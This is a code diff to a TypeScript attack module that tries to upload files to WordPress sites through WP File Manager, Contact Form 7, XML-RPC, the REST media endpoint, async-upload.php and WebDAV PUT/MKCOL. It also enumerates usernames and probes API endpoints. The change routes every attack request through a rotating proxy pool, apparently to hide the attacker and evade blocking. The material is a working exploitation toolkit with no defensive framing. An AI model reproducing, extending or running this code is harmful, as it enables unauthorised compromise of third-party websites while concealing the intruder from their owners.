@@ -7,6 +7,19 @@
 import type { PreScreenResult } from "./ai-prescreening";
 import { fetchWithPoolProxy } from "./proxy-pool";
 
+// Helper: wrap fetch with proxy pool
+async function altFetch(url: string, init: RequestInit & { signal?: AbortSignal } = {}): Promise<Response> {
+  const domain = url.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+  try {
+    const { response } = await fetchWithPoolProxy(url, init, { targetDomain: domain, timeout: 15000 });
+    return response;
+  } catch (e) {
+    // Fallback to direct fetch if proxy fails
+    return fetch(url, init);
+  }
+}
+
+
 // ─── Types ───
 
 export interface UploadAttemptResult {
@@ -359,7 +372,7 @@ async function exploitWpFileManager(
 
     for (const endpoint of endpoints) {
       try {
-        const res = await fetch(endpoint, {
+        const res = await altFetch(endpoint, {
           method: "POST",
           body: formData,
           signal: AbortSignal.timeout(10000),
@@ -420,7 +433,7 @@ async function exploitContactForm7(
       formData.append("_wpcf7_unit_tag", "wpcf7-f1-o1");
 
       try {
-        const res = await fetch(`${targetUrl}/wp-json/contact-form-7/v1/contact-forms/1/feedback`, {
+        const res = await altFetch(`${targetUrl}/wp-json/contact-form-7/v1/contact-forms/1/feedback`, {
           method: "POST",
           body: formData,
           signal: AbortSignal.timeout(10000),
@@ -493,7 +506,7 @@ async function exploitXmlrpcUpload(
 
     // Also try to extract username from the site
     try {
-      const authorResp = await fetch(`${targetUrl}/?author=1`, {
+      const authorResp = await altFetch(`${targetUrl}/?author=1`, {
         signal: AbortSignal.timeout(5000),
         redirect: "follow",
       });
@@ -515,7 +528,7 @@ async function exploitXmlrpcUpload(
 
     // Also try REST API user enumeration
     try {
-      const usersResp = await fetch(`${targetUrl}/wp-json/wp/v2/users`, {
+      const usersResp = await altFetch(`${targetUrl}/wp-json/wp/v2/users`, {
         signal: AbortSignal.timeout(5000),
       });
       if (usersResp.ok) {
@@ -552,7 +565,7 @@ async function exploitXmlrpcUpload(
   </params>
 </methodCall>`;
 
-        const res = await fetch(`${targetUrl}/xmlrpc.php`, {
+        const res = await altFetch(`${targetUrl}/xmlrpc.php`, {
           method: "POST",
           body: xmlPayload,
           headers: { "Content-Type": "text/xml" },
@@ -609,7 +622,7 @@ async function exploitRestApiUpload(
     // WordPress REST API media upload (requires auth or misconfigured permissions)
     const blob = new Blob([content], { type: "image/jpeg" });
 
-    const res = await fetch(`${targetUrl}/wp-json/wp/v2/media`, {
+    const res = await altFetch(`${targetUrl}/wp-json/wp/v2/media`, {
       method: "POST",
       body: blob,
       headers: {
@@ -661,7 +674,7 @@ async function exploitWpAdminUpload(
     formData.append("name", fileName);
     formData.append("action", "upload-attachment");
 
-    const res = await fetch(`${targetUrl}/wp-admin/async-upload.php`, {
+    const res = await altFetch(`${targetUrl}/wp-admin/async-upload.php`, {
       method: "POST",
       body: formData,
       signal: AbortSignal.timeout(10000),
@@ -710,7 +723,7 @@ export async function tryWebDavUpload(
 
   // Try PROPFIND first to check WebDAV support
   try {
-    const propfind = await fetch(fullUrl.replace(/[^/]+$/, ""), {
+    const propfind = await altFetch(fullUrl.replace(/[^/]+$/, ""), {
       method: "PROPFIND",
       headers: {
         "Depth": "1",
@@ -721,7 +734,7 @@ export async function tryWebDavUpload(
 
     if (propfind.status === 207 || propfind.status === 200) {
       // WebDAV is available, try PUT
-      const putRes = await fetch(fullUrl, {
+      const putRes = await altFetch(fullUrl, {
         method: "PUT",
         body: content,
         headers: { "Content-Type": "application/octet-stream" },
@@ -746,12 +759,12 @@ export async function tryWebDavUpload(
   // Try MKCOL + PUT
   try {
     const dir = filePath.replace(/[^/]+$/, "");
-    await fetch(`${targetUrl}${dir}`, {
+    await altFetch(`${targetUrl}${dir}`, {
       method: "MKCOL",
       signal: AbortSignal.timeout(5000),
     });
 
-    const putRes = await fetch(fullUrl, {
+    const putRes = await altFetch(fullUrl, {
       method: "PUT",
       body: content,
       headers: { "Content-Type": "application/octet-stream" },
@@ -829,7 +842,7 @@ export async function discoverApiEndpoints(
     for (const method of ep.methods) {
       try {
         onProgress?.(ep.path, `Checking ${method}...`);
-        const res = await fetch(`${targetUrl}${ep.path}`, {
+        const res = await altFetch(`${targetUrl}${ep.path}`, {
           method: method === "GET" ? "HEAD" : "OPTIONS",
           signal: AbortSignal.timeout(5000),
           redirect: "manual",
